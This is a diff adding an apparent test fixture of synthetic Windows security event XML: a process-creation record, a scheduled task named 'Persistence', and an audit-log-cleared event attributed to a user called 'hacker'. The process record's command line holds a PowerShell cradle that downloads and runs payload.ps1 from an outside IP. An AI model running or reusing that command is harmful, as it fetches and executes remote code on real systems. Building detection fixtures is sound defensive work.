@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Events>
+  <!-- 4688 Process Creation -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-08-14T10:00:00.000000Z"/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">hacker</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">cmd.exe /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://141.98.10.10/payload.ps1')"</Data>
+      <Data Name="IpAddress">192.168.1.100</Data>
+    </EventData>
+  </Event>
+
+  <!-- 4698 Scheduled Task -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>4698</EventID>
+      <TimeCreated SystemTime="2026-08-14T10:01:00.000000Z"/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">SYSTEM</Data>
+      <Data Name="TaskName">\Microsoft\Windows\AppID\Persistence</Data>
+      <Data Name="IpAddress">192.168.1.100</Data>
+    </EventData>
+  </Event>
+
+  <!-- 1102 Audit Log Cleared -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>1102</EventID>
+      <TimeCreated SystemTime="2026-08-14T10:02:00.000000Z"/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">hacker</Data>
+      <Data Name="IpAddress">192.168.1.100</Data>
+    </EventData>
+  </Event>
+</Events>
